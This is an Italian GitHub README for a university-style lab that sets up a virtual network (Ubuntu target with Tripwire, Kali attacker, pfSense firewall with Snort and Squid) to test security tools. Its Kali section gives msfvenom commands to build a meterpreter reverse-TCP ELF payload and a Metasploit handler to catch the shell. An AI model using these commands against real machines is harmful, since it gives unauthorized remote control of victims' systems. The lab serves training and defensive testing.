
# ProjectAdvancedCybersecurity
Il seguente repository ha lo scopo di illustrare come configurare una rete di macchine virtuali al fine di testare alcuni software legati alla sicurezza informatica. L' architettura viene riportata in figura.
![Architettura della rete](https://github.com/Me77y99/Project-AdvancedCybersecurity/main/Screened-Network.png)
Le macchine virtuali sono le seguenti: 
 - **Target**: Ubuntu 22.04.2 LTS (con installato *Tripwire*)
 - **Attacker**: Kali 2023.1 (con installato *python3*)
 - **Firewall**: Pfsense 2.6.0 (con i pacchetti *Squid* e *Snort*)

Di seguito verranno esplicitati tutti i passi sia per simulare uno scenario di attacco a cui la nostra infrastruttura dovrà rispondere.
> Nota: nel repository si trovano le macchine già configurate (potrebbero esserci delle differenze nell'assegnazione degli indirizzi IP alle varie interfacce di rete o in ulteriori parametri)

***mettere configurazione adpter 

## Kali Attacker
Per effettuare l'attacco la macchina kali necessita di avere installato python3. 
```bash
sudo  apt update &&  sudo  apt upgrade -y
```
```bash
sudo apt install python3
```
Fatto ciò  si può procedere ad effettuare un attacco di reverse shell TCP verso la macchina target tramite *Metasploit*. Aprire 3 terminal:

 1. **Terminale**: Ottenere indirizzo ip del target 
 ```bash
ifconfig
```
 
 2. **Terminale**: Creare il pacchetto malevolo (eseguibile)
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.18 LPORT=4444 -f elf -o shell-x86.elf
```
Analizziamo i vari parametri:

-   _msfvenom_: il nome del programma principale, metasploit
-   _-p_: il payload da inserire. Può essere uno scritto da noi o, più comodamente, uno già presente in Metasploit.
-   _LHOST_: l'indirizzo IP al quale l'app infettata si connetterà. Può essere un indirizzo locale come un indirizzo esterno.
-   _LPORT_: la porta da utilizzare. Quella di default è proprio la 4444.
-  _-f_: formato del pacchetto
-   _-o_: il percorso dove andremo a salvare l'applicazione ricompilata, contenente il payload.

 3. **Terminale**: Ora dobbiamo essere pronti per accettare la connessione, quindi prepariamo una sessione attraverso metasplot.
```bash
msfconsle
```
Una volta aperta la console:
```bash
msf6> use exploit/multi/handler
msf6> set payload linux/x86/meterpreter/reverse_tcp
msf6> set LHOST 192.168.1.18
msf6> set LPORT 4444
msf6> exploit

[*] Started reverse handler on 192.168.1.18:4444
[*] Starting the payload handler...
```
Una volta che la vittima avrà installato ed eseguito il file *.elf*  verrà aperta una sessione con una reverse shell che permetterà alla macchina kali infettare il target



## Autori

- [@Mattia Scuriatti](https://github.com/Me77y99)
- [@Gatti Giada](https://github.com/)

